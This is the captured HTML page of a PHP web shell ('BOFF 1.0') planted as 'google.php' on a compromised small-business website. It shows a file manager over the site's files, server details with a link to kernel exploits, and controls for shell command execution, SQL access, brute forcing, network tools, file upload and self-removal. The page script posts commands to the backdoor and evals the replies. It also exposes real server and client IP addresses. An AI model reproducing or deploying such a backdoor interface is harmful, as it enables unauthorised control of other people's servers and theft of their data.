<html><head><meta http-equiv='Content-Type' content='text/html; charset=Windows-1251'><title>tintoreriahidrosec.es - BOFF 1.0</title>
<style>
body{background-color:#000028;color:#e1e1e1;}
body,td,th{ border:1px outset black;font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ border-left:5px solid #df5;color:#fff;background-color:#000028; }
span,h1,a{ color: #df5 !important; }
span{ font-weight: bolder; }
h1{ border-left:7px solid #df5;padding: 2px 5px;font: 14pt Verdana;background-color:#000028;margin:0px; }
div.content{ padding: 7px;margin-left:7px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:250px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid #df5; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#003300;}
.main tr:hover{border:2px outset gray;;background-color:#5e5e5e}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
</style>
<script>
    var c_ = '/home/websevil/public_html/tintoreriahidrosec.es/';
    var a_ = 'FilesMan'
    var charset_ = 'Windows-1251';
    var p1_ = '';
    var p2_ = '';
    var p3_ = '';
    var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('/google.php', params);
	}
	function sr(url, params) {	
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp("(\\d+)([\\S\\s]*)", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form><table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:</span></td><td><nobr>Linux milan.evalice.net 2.6.18-448.3.1.el5.lve0.8.64 #1 SMP Mon Apr 8 12:06:12 EEST 2013 x86_64 <a href="http://exploit-db.com/list.php?description=Linux+Kernel+2.6.18" target=_blank>[exploit-db.com]</a></nobr><br>1178 ( websevil ) <span>Group:</span> 1172 ( websevil )<br>5.3.27 <span>Safe mode:</span> <font color=#00bb00><b>OFF</b></font> <a href=# onclick="g('Php',null,'','info')">[ phpinfo ]</a> <span>Datetime:</span> 2013-10-29 02:16:18<br>1367.59 GB <span>Free:</span> 245.17 GB (17%)<br><a href='#' onclick='g("FilesMan","/")'>/</a><a href='#' onclick='g("FilesMan","/home/")'>home/</a><a href='#' onclick='g("FilesMan","/home/websevil/")'>websevil/</a><a href='#' onclick='g("FilesMan","/home/websevil/public_html/")'>public_html/</a><a href='#' onclick='g("FilesMan","/home/websevil/public_html/tintoreriahidrosec.es/")'>tintoreriahidrosec.es/</a> <font color=#25ff00>drwxr-x---</font> <a href=# onclick="g('FilesMan','/home/websevil/public_html/tintoreriahidrosec.es','','','')">[ home ]</a><br></td><td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset"><option value="UTF-8" >UTF-8</option><option value="Windows-1251" selected>Windows-1251</option><option value="KOI8-R" >KOI8-R</option><option value="KOI8-U" >KOI8-U</option><option value="cp866" >cp866</option></optgroup></select><br><span>Server IP:</span><br>88.198.131.169<br><span>Client IP:</span><br>82.103.137.141</nobr></td></tr></table><table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr><th width="10%">[ <a href="#" onclick="g('SecInfo',null,'','','')">Sec. Info</a> ]</th><th width="10%">[ <a href="#" onclick="g('FilesMan',null,'','','')">Files</a> ]</th><th width="10%">[ <a href="#" onclick="g('Console',null,'','','')">Console</a> ]</th><th width="10%">[ <a href="#" onclick="g('Sql',null,'','','')">Sql</a> ]</th><th width="10%">[ <a href="#" onclick="g('Php',null,'','','')">Php</a> ]</th><th width="10%">[ <a href="#" onclick="g('SafeMode',null,'','','')">Safe mode</a> ]</th><th width="10%">[ <a href="#" onclick="g('StringTools',null,'','','')">String tools</a> ]</th><th width="10%">[ <a href="#" onclick="g('Bruteforce',null,'','','')">Bruteforce</a> ]</th><th width="10%">[ <a href="#" onclick="g('Network',null,'','','')">Network</a> ]</th><th width="10%">[ <a href="#" onclick="g('SelfRemove',null,'','','')">Self remove</a> ]</th></tr></table><div style="margin:5"><h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script><script>
	function sa() {
		for(i=0;i<d.files.elements.length;i++)
			if(d.files.elements[i].type == 'checkbox')
				d.files.elements[i].checked = d.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g("FilesMan",null,"s_name_0")'>Name</a></th><th><a href='#' onclick='g("FilesMan",null,"s_size_0")'>Size</a></th><th><a href='#' onclick='g("FilesMan",null,"s_modify_0")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g("FilesMan",null,"s_perms_0")'>Permissions</a></th><th>Actions</th></tr><tr><td><input type=checkbox name="f[]" value=".." class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/websevil/public_html/tintoreriahidrosec.es/..');" title=><b>[ .. ]</b></a></td><td>dir</td><td>2013-10-26 12:32:43</td><td>websevil/nobody</td><td><a href=# onclick="g('FilesTools',null,'..','chmod')"><font color=#25ff00>drwxr-x---</font></td><td><a href="#" onclick="g('FilesTools',null,'..', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'..', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="cgi-bin" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/websevil/public_html/tintoreriahidrosec.es/cgi-bin');" title=><b>[ cgi-bin ]</b></a></td><td>dir</td><td>2011-10-26 03:03:17</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'cgi-bin','chmod')"><font color=#25ff00>drwxr-xr-x</font></td><td><a href="#" onclick="g('FilesTools',null,'cgi-bin', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'cgi-bin', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value="imagenes" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/websevil/public_html/tintoreriahidrosec.es/imagenes');" title=><b>[ imagenes ]</b></a></td><td>dir</td><td>2013-10-28 14:22:22</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'imagenes','chmod')"><font color=#25ff00>drwxr-xr-x</font></td><td><a href="#" onclick="g('FilesTools',null,'imagenes', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'imagenes', 'touch')">T</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="Scripts" class=chkbx></td><td><a href=# onclick="g('FilesMan','/home/websevil/public_html/tintoreriahidrosec.es/Scripts');" title=><b>[ Scripts ]</b></a></td><td>dir</td><td>2013-10-29 02:16:16</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'Scripts','chmod')"><font color=#25ff00>drwxr-xr-x</font></td><td><a href="#" onclick="g('FilesTools',null,'Scripts', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'Scripts', 'touch')">T</a></td></tr><tr><td><input type=checkbox name="f[]" value=".DS_Store" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'.DS_Store', 'view')">.DS_Store</a></td><td>6.00 KB</td><td>2012-03-28 18:03:46</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'.DS_Store','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'.DS_Store', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'.DS_Store', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'.DS_Store', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'.DS_Store', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value=".ftpquota" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'.ftpquota', 'view')">.ftpquota</a></td><td>11 B</td><td>2013-10-22 00:57:23</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'.ftpquota','chmod')"><font color=#25ff00>-rw-------</font></td><td><a href="#" onclick="g('FilesTools',null,'.ftpquota', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'.ftpquota', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'.ftpquota', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'.ftpquota', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="contacto.swf" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'contacto.swf', 'view')">contacto.swf</a></td><td>170.34 KB</td><td>2012-03-28 18:03:47</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'contacto.swf','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'contacto.swf', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'contacto.swf', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'contacto.swf', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'contacto.swf', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="galeria.swf" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'galeria.swf', 'view')">galeria.swf</a></td><td>647.86 KB</td><td>2012-03-28 18:03:53</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'galeria.swf','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'galeria.swf', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'galeria.swf', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'galeria.swf', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'galeria.swf', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="google.php" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'google.php', 'view')">google.php</a></td><td>66.35 KB</td><td>2013-10-26 12:38:54</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'google.php','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'google.php', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'google.php', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'google.php', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'google.php', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="googleb654ec274c076dae.html" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'googleb654ec274c076dae.html', 'view')">googleb654ec274c076dae.html</a></td><td>53 B</td><td>2013-06-09 23:10:31</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'googleb654ec274c076dae.html','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'googleb654ec274c076dae.html', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'googleb654ec274c076dae.html', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'googleb654ec274c076dae.html', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'googleb654ec274c076dae.html', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="img_entrada.swf" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'img_entrada.swf', 'view')">img_entrada.swf</a></td><td>225.91 KB</td><td>2012-03-28 18:03:40</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'img_entrada.swf','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'img_entrada.swf', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'img_entrada.swf', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'img_entrada.swf', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'img_entrada.swf', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="index.html" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'index.html', 'view')">index.html</a></td><td>2.32 KB</td><td>2013-10-22 20:17:06</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'index.html','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'index.html', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'index.html', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'index.html', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'index.html', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="indexbak.htm" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'indexbak.htm', 'view')">indexbak.htm</a></td><td>2.94 KB</td><td>2013-06-01 23:48:00</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'indexbak.htm','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'indexbak.htm', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'indexbak.htm', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'indexbak.htm', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'indexbak.htm', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="inicio.swf" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'inicio.swf', 'view')">inicio.swf</a></td><td>199.15 KB</td><td>2012-03-28 18:03:42</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'inicio.swf','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'inicio.swf', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'inicio.swf', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'inicio.swf', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'inicio.swf', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="instalaciones.swf" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'instalaciones.swf', 'view')">instalaciones.swf</a></td><td>5.46 KB</td><td>2012-03-28 18:03:43</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'instalaciones.swf','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'instalaciones.swf', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'instalaciones.swf', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'instalaciones.swf', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'instalaciones.swf', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="maquinaria.swf" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'maquinaria.swf', 'view')">maquinaria.swf</a></td><td>4.69 KB</td><td>2012-03-28 18:03:43</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'maquinaria.swf','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'maquinaria.swf', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'maquinaria.swf', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'maquinaria.swf', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'maquinaria.swf', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="nosotros.swf" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'nosotros.swf', 'view')">nosotros.swf</a></td><td>4.73 KB</td><td>2012-03-28 18:03:44</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'nosotros.swf','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'nosotros.swf', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'nosotros.swf', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'nosotros.swf', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'nosotros.swf', 'download')">D</a></td></tr><tr class=l1><td><input type=checkbox name="f[]" value="servicio.swf" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'servicio.swf', 'view')">servicio.swf</a></td><td>3.71 KB</td><td>2012-03-28 18:03:44</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'servicio.swf','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'servicio.swf', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'servicio.swf', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'servicio.swf', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'servicio.swf', 'download')">D</a></td></tr><tr><td><input type=checkbox name="f[]" value="web+hidrosec2.swf" class=chkbx></td><td><a href=# onclick="g('FilesTools',null,'web+hidrosec2.swf', 'view')">web hidrosec2.swf</a></td><td>108.14 KB</td><td>2012-03-28 18:03:45</td><td>websevil/websevil</td><td><a href=# onclick="g('FilesTools',null,'web+hidrosec2.swf','chmod')"><font color=#25ff00>-rw-r--r--</font></td><td><a href="#" onclick="g('FilesTools',null,'web+hidrosec2.swf', 'rename')">R</a> <a href="#" onclick="g('FilesTools',null,'web+hidrosec2.swf', 'touch')">T</a> <a href="#" onclick="g('FilesTools',null,'web+hidrosec2.swf', 'edit')">E</a> <a href="#" onclick="g('FilesTools',null,'web+hidrosec2.swf', 'download')">D</a></td></tr><tr><td colspan=7>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='/home/websevil/public_html/tintoreriahidrosec.es/'>
	<input type=hidden name=charset value='Windows-1251'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option><option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option><option value='tar'>Compress (tar.gz)</option></select>&nbsp;<input type='submit' value='>>'></td></tr></form></table></div>
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
	<tr>
		<td><form onsubmit='g(null,this.c.value,"");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='/home/websevil/public_html/tintoreriahidrosec.es/'><input type=submit value='>>'></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value);return false;"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit="g('FilesMan',null,'mkdir',this.d.value);return false;"><span>Make dir:</span> <font color='#25ff00'>(Writeable)</font><br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>
		<td><form onsubmit="g('FilesTools',null,this.f.value,'mkfile');return false;"><span>Make file:</span> <font color='#25ff00'>(Writeable)</font><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
	</tr><tr>
		<td><form onsubmit="g('Console',null,this.c.value);return false;"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
		<td><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='/home/websevil/public_html/tintoreriahidrosec.es/'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='Windows-1251'>
		<span>Upload file:</span> <font color='#25ff00'>(Writeable)</font><br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
	</tr></table></div></body></html>